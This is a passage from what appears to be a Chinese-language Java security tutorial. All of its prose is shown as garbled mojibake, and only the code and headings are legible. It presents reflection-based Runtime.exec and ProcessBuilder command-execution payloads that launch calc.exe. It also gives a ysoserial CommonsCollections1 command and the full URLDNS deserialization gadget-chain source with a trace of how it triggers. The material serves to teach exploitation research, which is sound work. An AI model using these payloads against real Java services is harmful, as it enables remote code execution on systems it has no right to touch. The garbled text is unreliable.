·å°±å¯ä»¥åœ¨æ‰§è¡Œç³»ç»Ÿå‘½ä»¤æ—¶è®©jvmçŸ¥é“æˆ‘ä»¬è¦å¯¹å“ªä¸ªjavaç¨‹åºæ‰§è¡Œå‘½ä»¤\n\næˆ‘ä»¬åˆ†æä»¥ä¸‹ä¸Šé¢æ‰§è¡Œå‘½ä»¤çš„ä¸¤è¡Œä»£ç \n\n- é€šè¿‡åå°„è·å¾—Runtimeç±»\n- é€šè¿‡åå°„è·å¾—clazz(Runtime)ä¸­çš„`exec`æ–¹æ³•\n- `invoke()`è°ƒç”¨execæ–¹æ³•\n- è°ƒç”¨`getRuntime()`å°†å½“å‰javaç¨‹åºè¿è¡Œçš„ç¯å¢ƒä½œä¸ºå‚æ•°ä¼ é€’ç»™invokeï¼Œå¹¶æ‰§è¡Œå‘½ä»¤`exec \"calc.exe\"`\n\nå¯ä»¥å‘ç°æˆ‘ä»¬åœ¨ç”¨invokeæ‰§è¡ŒRuntimeä¸­çš„å‘½ä»¤æ—¶ï¼Œå¦‚æœä¸èƒ½é€šè¿‡`newInstance`æ¥å®ä¾‹åŒ–å¯¹è±¡ä½œä¸ºå‚æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è°ƒç”¨`getRuntime()`æ¥è·å–å½“å‰ç¯å¢ƒï¼Œä»è€Œä»£æ›¿invokeçš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚\n\nä¸Šé¢æ‰§è¡Œå‘½ä»¤çš„ä¸¤è¡Œä»£ç åˆ†è§£å¼€å°±æ˜¯ï¼š\n\n```\nClass clazz = Class.forname(\"java.lang.Runtime\");\nMethod execMethod = clazz.getMethod(\"exec\", String.class);\nMethod getRuntime = clazz.getMethod(\"getRuntime\")ï¼›\nObject currentRuntime = getRuntime.invoke(clazz);\nexecMethod.invoke(currentRuntime, \"calc.exe\");\n\n```\n\n## **ä¸€äº›å…¶ä»–çš„åå°„æœºåˆ¶**\n\n- æˆ‘ä»¬åˆšæ‰è¯´åˆ°å¯ä»¥é€šè¿‡fornameæ‹¿åˆ°äº†ä¸€ä¸ªç±»ï¼Œå¹¶ä¸”ç»§ç»­åˆ©ç”¨åå°„æˆ–å®ä¾‹åŒ–è°ƒç”¨å…¶ä¸­çš„æ–¹æ³•ï¼Œå¦‚æœä¸€ä¸ªç±»æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•æˆ–è€…ä¹Ÿæ²¡æœ‰ç±»ä¼¼å•ä¾‹æ¨¡å¼é‡Œçš„é™æ€æ–¹æ³•ï¼Œé‚£æˆ‘ä»¬åº”è¯¥æ€æ ·é€šè¿‡åå°„å®ä¾‹åŒ–è¯¥ç±»å‘¢ï¼Ÿ\n- å¦‚æœä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ æ–¹æ³•æ˜¯ç§æœ‰æ–¹æ³•ï¼Œæˆ‘ä»¬åº”è¯¥æ€ä¹ˆå»æ‰§è¡Œå®ƒå‘¢ï¼Ÿ\n\n### **åˆ©ç”¨`ProcessBuilder`æ‰§è¡Œå‘½ä»¤**\n\nç¬¬ä¸€ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸ªæ–°çš„åå°„æ–¹æ³•`getConstructor`ã€‚\n\nå’ŒgetMethodç±»ä¼¼ï¼Œ`getConstructor`æ¥æ”¶çš„å‚æ•°æ˜¯æ„é€ å‡½æ•°çš„çš„åˆ—è¡¨ç±»å‹ï¼Œå› ä¸ºæ„é€ å‡½æ•°ä¹Ÿæ”¯æŒé‡è½½ï¼Œæ‰€ä»¥è¦ç”¨å‚æ•°åˆ—è¡¨ç±»å‹æ‰èƒ½å”¯ä¸€ç¡®å®šä¸€ä¸ªæ„é€ å‡½æ•°\n\næ¯”å¦‚æˆ‘ä»¬å¸¸ç”¨çš„å¦ä¸€ç§æ‰§è¡Œå‘½ä»¤çš„æ–¹å¼ProcessBuilderï¼Œæˆ‘ä»¬ä½¿ç”¨åå°„æ¥è·å–å…¶æ„é€ å‡½æ•°ï¼Œç„¶å è°ƒç”¨`start()`æ¥æ‰§è¡Œå‘½ä»¤\n\n**ProcessBuilder:**\n\nProcessBuilderç”¨äºåˆ›å»ºæ“ä½œç³»ç»Ÿè¿›ç¨‹ï¼Œå®ƒæä¾›ä¸€ç§å¯åŠ¨å’Œç®¡ç†è¿›ç¨‹ï¼ˆä¹Ÿå°±æ˜¯åº”ç”¨ç¨‹åºï¼‰çš„æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡å®ä¾‹åŒ–è¿™ä¸ªç±»å¹¶ä¸”é€šè¿‡åå°„è°ƒç”¨å…¶ä¸­çš„startæ–¹æ³•æ¥å¼€å¯ä¸€ä¸ªå­è¿›ç¨‹ ï¼Œæˆ‘ä»¬å¯ä»¥ç†è§£æˆå½“`getRuntime`è¢«ç¦ç”¨æ—¶ï¼Œå¯ä»¥ç”¨`ProcessBuilder`æ¥æ‰§è¡Œå‘½ä»¤ã€‚\n\n`ProcessBuilder`æœ‰ä¸¤ä¸ªæ„é€ å‡½æ•°ï¼š\n\n- `public ProcessBuilder(List<String> command)`\n- `public ProcessBuilder(String... commang)`\n\næˆ‘ä»¬ç”¨`ProcessBuilder`å†™ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„payloadï¼š\n\n```\n Class clazz = Class.forName(\"java.lang.ProcessBuilder\");\n ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\"))).start();\n\n```\n\n1. é¦–å…ˆåˆ©ç”¨åå°„è·å–`ProcessBuilder`ç±»ï¼›\n2. è·å–clazz(ProcessBuilder)å½¢å‚åˆ—è¡¨ä¸º`List<String> command`çš„æ„é€ å‡½æ•°ï¼›\n3. å°†è·å–åˆ°çš„æ„é€ å‡½æ•°åˆ©ç”¨newInstanceè¿›è¡Œå®ä¾‹åŒ–ï¼Œè°ƒç”¨æ„é€ å‡½æ•°ï¼›\n4. å¯¹æ„é€ å‡½æ•°ä¼ å…¥çš„å‚æ•°ä¸º `calc.exe`ï¼Œå¹¶ä¸”ç”¨`Arrays.asList`æ–¹æ³•å°†è¦æ‰§è¡Œçš„å‘½ä»¤è½¬ä¸ºListç±»å‹ï¼›\n5. è¿”å›Listç±»å‹çš„`command`ï¼›\n   \n    ![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201439885.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201439885.png)\n    \n    ![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201440303.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201440303.png)\n    \n    1. å°†Listç±»å‹çš„commandå¼ºåˆ¶è½¬æ¢ä¸º`ProcessBuilder`ç±»å‹ï¼Œè¿™æ ·å°±å¯ä»¥è°ƒç”¨`ProcessBuilder`ä¸­çš„startæ–¹æ³•æ‰“å¼€`calc.exe`è¿›ç¨‹ã€‚\n       \n        ![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201442162.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201442162.png)\n        \n    \n    å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•éœ€è¦ç”¨åˆ°å¼ºè½¬ï¼Œä½†æœ‰æ—¶å€™åœ¨åˆ©ç”¨æ¼æ´æ—¶å¹¶æ²¡æœ‰è¿™ç§è¯­æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬æ¥ç€åˆ©ç”¨åå°„æ¥å®Œæˆè¿™ä¸€æ­¥\n    \n    ```\n    Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getMethod(\"start\").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\"calc.exe\")));\n    \n    ```\n    \n    1. forNameè·å–ç±»ï¼›\n    2. è·å–clazzä¸­çš„`start`æ–¹æ³•ï¼›\n    3. ç”¨invokeæ‰§è¡Œstartæ–¹æ³•ï¼Œè¿™é‡Œæˆ‘ä»¬ä¹‹å‰è¯´è¿‡ç”¨invokeæ‰§è¡Œæ–¹æ³•æ—¶ï¼Œç¬¬ä¸€ä¸ªå‚æ•°è¦æ˜¯è¯¥æ–¹æ³•æ‰€åœ¨ç±»çš„å¯¹è±¡ï¼Œä½†clazzä¸­æ²¡æœ‰æ— å‚æ„é€ æ–¹æ³•ï¼Œæ‰€ä»¥invokeçš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸èƒ½æ˜¯`clazz.newInstance`ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬æ¢ä¸ªæ–¹æ³•ï¼Œé€šè¿‡`getConstructor`è·å–åˆ°`ProcessBuilder`çš„æ„é€ å‡½æ•°ï¼Œå¹¶åˆ©ç”¨è¿™ä¸ªæ„é€ å‡½æ•°`newInstance`ï¼Œåœ¨å®ä¾‹åŒ–çš„åŒæ—¶å¯¹æ„é€ æ–¹æ³•ä¼ å…¥å‚æ•°`calc.exe`ï¼Œå› ä¸ºæˆ‘ä»¬åˆšæ‰æåˆ°äº†`ProcessBuilder`æ˜¯æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°çš„ï¼Œæ‰€ä»¥åœ¨å®ä¾‹åŒ–çš„æ—¶å€™å¿…é¡»è¦ä¼ å…¥å‚æ•°ã€‚ï¼ˆè¿™é‡Œè·å–çš„æ„é€ æ–¹æ³•ä¾ç„¶æ˜¯ä¸Šé¢æåˆ°çš„å½¢å‚åˆ—è¡¨ä¸ºListçš„æ„é€ å‡½æ•°ï¼‰\n    \n    é‚£ä¹ˆæˆ‘ä»¬å†æ¥çœ‹`ProcessBuilder`çš„å¦ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼š\n    \n    ![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201459962.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202209201459962.png)\n    \n    æˆ‘ä»¬çœ‹åˆ°è¿™ä¸ªæ„é€ æ–¹æ³•çš„å‚æ•°åˆ—è¡¨ä¸º`String... command`ï¼Œè¿™ä¸ªå‚æ•°åˆ—è¡¨çš„æ„æ€å…¶å®å°±æ˜¯å‚æ•°æ•°é‡å¯å˜åˆ—è¡¨ï¼Œå½“æˆ‘ä»¬åœ¨å†™ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œä¸çŸ¥é“è¦ä¼ å…¥å¤šå°‘å‚æ•°ï¼Œæˆ‘ä»¬å°±å¯ä»¥å†™æˆ`Type... Args`çš„æ–¹å¼ï¼Œå…¶å®åœ¨åº•å±‚æ¥çœ‹`String... command`è¿™æ ·çš„å†™æ³•å°±ç­‰æ•ˆäº`String[] command`ï¼Œç›¸å½“äºä¼ å…¥äº†ä¸€ä¸ªå­—ç¬¦æ•°ç»„\n    \n    æ¯”å¦‚æœ‰ä¸€ä¸ªhelloæ–¹æ³•ï¼š\n    \n    ```\n    public void hello(String...names){}\n    \n    ```\n    \n    å¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªæ•°ç»„æƒ³ä¼ ç»™y1æ–¹æ³•ï¼Œåªéœ€è¦ç›´æ¥ä¼ å°±è¡Œï¼š\n    \n    ```\n    String[] names = {\"hello\", \"world\"};\n    hello(names)\n    \n    ```\n    \n    æ‰€ä»¥å¦‚æœæˆ‘ä»¬æƒ³è¦è·å–åˆ°å‚æ•°åˆ—è¡¨ä¸º`String... command` çš„è¿™ä¸ªæ„é€ æ–¹æ³•ï¼Œæˆ‘ä»¬åœ¨`getConstructor`æ—¶è¦ä¼ å…¥çš„å‚æ•°ä¸º`String[].class`ï¼Œåœ¨è°ƒç”¨newInstanceæ—¶ï¼Œå› ä¸ºè¿™ä¸ªæ„é€ æ–¹æ³•æœ¬èº«æ¥å—çš„å°±æ˜¯ä¸€ä¸ªå¯å˜é•¿æ•°ç»„ï¼Œæˆ‘ä»¬åœ¨ä¼ å…¥æ—¶ä¹Ÿä¼ å…¥äº†ä¸€ä¸ªæ•°ç»„ï¼Œå› æ­¤å åŠ èµ·æ¥æ˜¯ä¸€ä¸ªäºŒç»´æ•°ç»„ï¼Œæ‰€ä»¥åˆ©ç”¨è¿™ä¸ªæ„é€ æ–¹æ³•çš„payloadå¦‚ä¸‹ï¼š\n    \n    ```\n    Class clazz = Class.forName(\"java.lang.ProcessBuilder\");\n    ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[]{{\"calc.exe\"}})).start();\n    \n    ```\n    \n    1. åå°„æ‹¿åˆ°ç±»ï¼›\n    2. `getConstructor`æ‹¿åˆ°å‚æ•°åˆ—è¡¨ä¸º`String... command`çš„æ„é€ æ–¹æ³•ï¼›\n    3. `newInstance`è§¦å‘è¯¥æ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”ä¼ å…¥ä¸€ä¸ªäºŒç»´å­—ç¬¦æ•°ç»„ï¼›\n    4. ç”±äºè¿”å›çš„commandæ˜¯å­—ç¬¦æ•°ç»„ç±»å‹ï¼Œæ‰€ä»¥å¼ºè½¬ä¸º`ProcessBuilder`å¹¶ç”¨`start()`æ–¹æ³•è§¦å‘ï¼›\n\n### å¦‚ä½•é€šè¿‡åå°„æ‰§è¡Œç§æœ‰æ–¹æ³•\n\nå†å›åˆ°ç¬¬äºŒä¸ªé—®é¢˜ä¸Šï¼Œå¦‚æœä¸€ä¸ªæ–¹æ³•æˆ–æ„é€ æ–¹æ³•æ˜¯privateï¼Œæˆ‘ä»¬æ˜¯å¦èƒ½æ‰§è¡Œå®ƒå‘¢ï¼Ÿ\n\nè¿™é‡Œå°±è¦ç”¨åˆ°`getDeclared`ç³»åˆ—çš„åå°„äº†ï¼Œä¸æ™®é€šçš„`getMethodï¼ŒgetConstructor`åŒºåˆ«æ˜¯ï¼š\n\n- `getMethod`ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­æ‰€æœ‰å…¬å…±æ–¹æ³•ï¼ŒåŒ…æ‹¬ä»çˆ¶ç±»ç»§æ‰¿çš„æ–¹æ³•ï¼›\n- `getDeclaredMethod`ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­â€œå£°æ˜â€çš„æ–¹æ³•ï¼Œæ˜¯å®å†™åœ¨è¿™ä¸ªç±»é‡Œçš„ï¼ŒåŒ…æ‹¬ç§æœ‰çš„æ–¹æ³•ï¼Œä½†ä»çˆ¶ç±»é‡Œç»§æ‰¿æ¥çš„å°±ä¸åŒ…å«äº†\n\nåœ¨ç”¨æ³•ä¸Š`getDeclaredMethod`çš„å…·ä½“ç”¨æ³•ä¸`getMethod`ç±»ä¼¼ï¼Œ`getDeclaredConstructor`çš„å…·ä½“ç”¨æ³•å’Œ`getConstructor`ç±»ä¼¼\n\nä¸¾ä¸ªä¾‹å­ï¼Œæˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡Runtimeçš„æ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡`Runtime.getRuntime()`æ¥è·å–å¯¹è±¡ï¼Œå…¶å®æˆ‘ä»¬ä¹Ÿå¯ä»¥ç›´æ¥ç”¨`getDeclaredConstructor`æ¥è·å–è¿™ä¸ªç§æœ‰çš„æ„é€ æ–¹æ³•å®ä¾‹åŒ–å¯¹è±¡ï¼Œè¿›è€Œæ‰§è¡Œå‘½ä»¤ï¼š\n\n```\nClass clazz = Class.forName(\"java.lang.Runtime\");\n        Constructor m =clazz.getDeclaredConstructor();\n        m.setAccessible(true);\n        clazz.getMethod(\"exec\",String.class).invoke(m.newInstance(), \"calc.exe\");\n\n```\n\nè¿™é‡Œæˆ‘ä»¬åœ¨è·å–åˆ°ç§æœ‰æ–¹æ³•åï¼Œè¦ç”¨`setAccessible()`æ–¹æ³•ä½¿è¿™ä¸ªç§æœ‰æ–¹æ³•å¯ä»¥è¢«è®¿é—®ï¼Œå…¶ä»–çš„å°±å’Œä¹‹å‰ä»‹ç»çš„åå°„ä¸€æ ·äº†ï¼Œå¦‚æœä¸ç”¨`setAccessible()`æ–¹æ³•ä¿®æ”¹ä½œç”¨åŸŸè¿™ä¸ªæ–¹æ³•æ˜¯ä»ç„¶ä¸èƒ½è°ƒç”¨çš„\n\nâ€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”â€”\n\n## **ysoserial**\n\nåœ¨ä¸Šæ‰‹javaååºåˆ—åŒ–çš„ç¬¬ä¸€æ¡é“¾å­ä¹‹å‰ï¼Œæˆ‘ä»¬éœ€è¦ä¸€ä¸ªé›†æˆäº†javaååºåˆ—åŒ–å„ç§gadget chainsï¼ˆåˆ©ç”¨é“¾ï¼‰çš„å·¥å…·ï¼Œ[ysoserial](https://github.com/frohoff/ysoserial)ã€‚\n\nysoserialä¸‹è½½å¥½åè¿˜éœ€è¦å†å®‰è£…ä¸€äº›å…¶ä»–çš„ä¾èµ–ï¼Œæ•™ç¨‹ç½‘ä¸Šæœ‰å¾ˆå¤šï¼Œæˆ‘å°±ä¸ç»†è¯´äº†ï¼Œæˆ‘ä»¬å…ˆç®€å•äº†è§£ä¸€ä¸‹ysoserialä¸­ä¸€äº›æ¯”è¾ƒé‡è¦çš„ä¸œè¥¿ã€‚\n\né¦–å…ˆæ˜¯åºåˆ—åŒ–ï¼ˆSerializeï¼‰ï¼š\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042134404.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042134404.png)\n\nè¿™ä¸ªåºåˆ—åŒ–æ“ä½œå’Œæˆ‘ä¹‹å‰æåˆ°çš„åŸºæœ¬æ˜¯ä¸€æ ·çš„ï¼Œå°†ä¸€ä¸ªå¯¹è±¡ä»¥å­—èŠ‚æµçš„å½¢å¼è¾“å‡ºå¹¶ä¿å­˜ï¼Œå¹¶è§¦å‘å®ƒçš„writeObjectã€‚\n\nååºåˆ—åŒ–ï¼ˆUnserialize å†ysoserialä¸­å«Deserializeï¼‰ï¼š\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042135076.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042135076.png)\n\nå°†ä¸€ä¸ªå­—èŠ‚æµè¯»å…¥è¿˜åŸä¸ºå¯¹è±¡å¹¶è§¦å‘å®ƒçš„readObjectã€‚\n\nPayloadrunnerï¼š\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042136702.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042136702.png)\n\nå¯ä»¥çœ‹åˆ°åœ¨Payloadrunnerä¸­ï¼Œå…ˆå°†å¯¹è±¡åºåˆ—åŒ–å†ååºåˆ—åŒ–ï¼Œå…¶å®å°±æ˜¯ç”¨æ¥è¿è¡Œæˆ‘ä»¬çš„é“¾ï¼Œå¹¶ç”Ÿæˆç›¸åº”çš„payloadï¼Œå…·ä½“æ‰§è¡Œå‘½ä»¤ï¼ˆç”¨ccé“¾ä¸¾ä¾‹ï¼‰ï¼š\n\n```\njava -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 \"id\"\n\n```\n\nå¦‚æœæˆ‘ä»¬ç›´æ¥å†intellijä¸­è¿è¡Œè¿™äº›é“¾ï¼Œä¸ä¼šå‡ºç°payloadï¼Œå¹¶ä¸”è¦æ³¨æ„ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨javaååºåˆ—åŒ–ä¸­å‡ ä¹æˆ‘ä»¬ååºåˆ—åŒ–æ‰§è¡Œå‘½ä»¤çš„ç»“æœæ˜¯æ²¡æœ‰å›æ˜¾çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ç”¨ä¸€äº›æ¯”è¾ƒæ˜æ˜¾çš„å‘½ä»¤è®©æˆ‘ä»¬çŸ¥é“è¿™ä¸ªé“¾å­è¢«æˆåŠŸè§¦å‘äº†ï¼Œåœ¨ysoserialä¸­æˆ‘ä»¬ä¸€èˆ¬ç”¨è®¡ç®—å™¨`calc.exe`ï¼Œä¸€èˆ¬æ¥è¯´ysoserialå®‰è£…å¥½åpayloadé»˜è®¤çš„å‚æ•°æ˜¯`calc.exe`ï¼Œå¦‚æœä¸æ˜¯çš„è¯å°±è¦è‡ªå·±æ‰‹åŠ¨è®¾ç½®é»˜è®¤å‚æ•°äº†ï¼Œå…·ä½“çš„æˆ‘å°±ä¸å¤šè¯´äº†ã€‚\n\n## **URLDNS**\n\né‚£ä¹ˆæˆ‘ä»¬æ¥ä¸Šæ‰‹javaååºåˆ—åŒ–çš„ç¬¬ä¸€æ¡é“¾å­ï¼Œ`URLDNS`ï¼Œè¿™æ¡é“¾å­çš„åˆ©ç”¨é“¾å¾ˆçŸ­ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹ysoserialä¸­çš„ä»£ç ï¼š\n\n```\npublic class URLDNS implements ObjectPayload<Object> {\n\n        public Object getObject(final String url) throws Exception {\n\n                //Avoid DNS resolution during payload creation\n                //Since the field <code>java.net.URL.handler</code> is transient, it will not be part of the serialized payload.\n                URLStreamHandler handler = new SilentURLStreamHandler();\n\n                HashMap ht = new HashMap(); // HashMap that will contain the URL\n                URL u = new URL(null, url, handler); // URL to use as the Key\n                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.\n\n                Reflections.setFieldValue(u, \"hashCode\", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.\n\n                return ht;\n        }\n\n        public static void main(final String[] args) throws Exception {\n                PayloadRunner.run(URLDNS.class, args);\n        }\n\n        /**\n         * <p>This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.\n         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior\n         * using the serialized object.</p>\n         *\n         * <b>Potential false negative:</b>\n         * <p>If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the\n         * second resolution.</p>\n         */\n        static class SilentURLStreamHandler extends URLStreamHandler {\n\n                protected URLConnection openConnection(URL u) throws IOException {\n                        return null;\n                }\n\n                protected synchronized InetAddress getHostAddress(URL u) {\n                        return null;\n                }\n        }\n}\n\n```\n\nä¸€ç‚¹ç‚¹åˆ†æä¸€ä¸‹ï¼Œé¦–å…ˆä»URLçš„åˆ›å»ºå¼€å§‹ï¼š\n\n```\nURLStreamHandler handler = new SilentURLStreamHandler();\n\n                HashMap ht = new HashMap(); // HashMap that will contain the URL\n                URL u = new URL(null, url, handler); // URL to use as the Key\n                ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.\n\n```\n\n- å…ˆæ˜¯ç”¨`URLStreamHandler`cåˆ›å»ºäº†ä¸€ä¸ªå¥æŸ„ï¼Œè¿™ä¸ªå¥æŸ„å¯ä»¥æ‰“å¼€ä¸€ä¸ªæŒ‡å®šçš„urlã€‚\n- åˆ›å»ºä¸€ä¸ªå“ˆå¸Œè¡¨ï¼Œå¹¶å°†urlå¯¹è±¡uä½œä¸ºkeyå­˜å…¥åˆ°äº†å“ˆå¸Œè¡¨ä¸­ã€‚\n\n```\nReflections.setFieldValue(u, \"hashCode\", -1); // During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.\n\n                return ht;\n        }\n\n        public static void main(final String[] args) throws Exception {\n                PayloadRunner.run(URLDNS.class, args);\n        }\n\n```\n\n- è¿™é‡Œå°†urlå¯¹è±¡uçš„hashCodeè®¾ç½®æˆäº†-1ï¼Œä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšæˆ‘ä»¬ä¸€ä¼šåœ¨åˆ†æå…·ä½“çš„è§¦å‘è¿‡ç¨‹æ—¶ä¼šæåˆ°ã€‚\n- è¿”å›äº†å“ˆå¸Œè¡¨å¯¹è±¡htï¼Œå¹¶ç”¨PayloadRunnerè¿è¡Œè¯¥åˆ©ç”¨é“¾ã€‚\n\nè¿™æ®µä»£ç å°±å¹²äº†è¿™äº›äº‹ï¼Œé‚£ä¹ˆæ˜¯æ€ä¹ˆè§¦å‘ååºåˆ—åŒ–çš„å‘¢ï¼Œæˆ‘ä»¬ä¹‹å‰æåˆ°è¿‡åœ¨ååºåˆ—åŒ–æ—¶ä¼šè§¦å‘readObjectï¼Œé‚£ä¹ˆæˆ‘ä»¬ç›´æ¥å»çœ‹Hashmapçš„readObjectæ–¹æ³•ï¼š\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042158533.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042158533.png)\n\næœ€é‡è¦çš„ä¸€è¡Œå°±æ˜¯æœ€åçš„`putValue`ï¼Œé‡Œé¢è®¡ç®—äº†å“ˆå¸Œè¡¨çš„é”®åã€‚æˆ‘ä»¬è·Ÿä¸€ä¸‹`putValue`æ–¹æ³•ï¼Œå‘ç°åˆ©ç”¨hashæ–¹æ³•è®¡ç®—äº†å“ˆå¸Œè¡¨çš„keyã€‚\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042238521.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042238521.png)\n\næˆ‘ä»¬å†ç»§ç»­è·Ÿè¿›hashæ–¹æ³•ï¼Œå‘ç°è¿™é‡Œè°ƒç”¨äº†å“ˆå¸Œè¡¨keyçš„hashcodeæ–¹æ³•ï¼Œæˆ‘ä»¬å›åˆ°åˆšæ‰åˆ›å»ºå“ˆå¸Œè¡¨æ—¶ï¼Œæ˜¯æŠŠurlå¯¹è±¡å­˜å…¥åˆ°äº†keyä¸­ï¼Œæ‰€ä»¥æˆ‘ä»¬ç›´æ¥å»æ‰¾`java.net.URL`çš„`hashCode`æ–¹æ³•ã€‚\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042239894.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042239894.png)\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042246526.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042246526.png)\n\nå¦‚æœhashCodeå€¼ä¸ä¸º-1ï¼Œé‚£ä¹ˆå°±ä¼šreturnï¼Œè¿™ä¸ªå°±æ˜¯æˆ‘ä»¬å‰é¢æåˆ°è¦å°†hashCodeçš„å€¼è®¾ç½®ä¸º-1çš„åŸå› ã€‚\n\næˆ‘ä»¬ç»§ç»­è·Ÿï¼Œhandleræ­¤æ—¶æ˜¯ä¸€ä¸ª`URLStreamHandler`å¯¹è±¡ï¼Œç»§ç»­è·Ÿè¿›å®ƒçš„hashCodeæ–¹æ³•ã€‚\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248715.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248715.png)\n\nè¿™é‡Œè°ƒç”¨äº†getHostAddressæ–¹æ³•ï¼Œç»§ç»­è·Ÿã€‚\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248820.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210042248820.png)\n\nåˆ°è¿™é‡Œå¯ä»¥çœ‹åˆ°`InetAddress.getByName(host)`çš„ä½œç”¨æ˜¯æ ¹æ®ä¸»æœºåï¼Œè·å–å…¶ipåœ°å€ï¼Œåœ¨ç½‘ç»œä¸Šå°±æ˜¯ä¸€æ¬¡DNSæŸ¥è¯¢ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡burpçš„`Collaborator client`æ¥çœ‹åˆ°è¿™æ¬¡urlè¯·æ±‚ã€‚\n\n![https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210051442767.png](https://cdn.jsdelivr.net/gh/y1zh3e7/Picgo/Blogimg/202210051442767.png)\n\n# ä»£ç†æ¨¡å¼\n\nåœ¨Spirngä¸­ï¼ŒAOPçš„åº•å±‚å®ç°å°±æ˜¯ä»£ç†æ¨¡å¼ï¼Œä»£ç†æ¨¡å¼åˆ†ä¸ºä¸¤ç§ï¼š\n\n- é™æ€ä»£ç†\n- åŠ¨æ€ä»£ç†\n\n## ä»€ä¹ˆæ˜¯ä»£ç†ï¼Ÿ\n\næˆ‘ä»¬ç”¨ä¸€ä¸ªç§Ÿæˆ¿çš„ä¾‹å­æ¥è¯´æ˜ï¼ŒæŒ‰ç…§æ­£å¸¸çš„é€»è¾‘æ¥è®²ï¼Œæˆ¿ä¸œæƒ³è¦å°†è‡ªå·±çš„æˆ¿å­å‡ºç§Ÿï¼Œå¹¶ä¸”æ­¤æ—¶æœ‰ä¸€ä¸ªç§Ÿå®¢æƒ³ç§Ÿè¿™ä¸ªæˆ¿å­ï¼Œé‚£ä¹ˆç§Ÿå®¢å°±å¯ä»¥ç›´æ¥æ‰¾åˆ°æˆ¿ä¸œå®Œæˆç§Ÿæˆ¿å­è¿™ä»¶äº‹ï¼š\n\n![Untitled 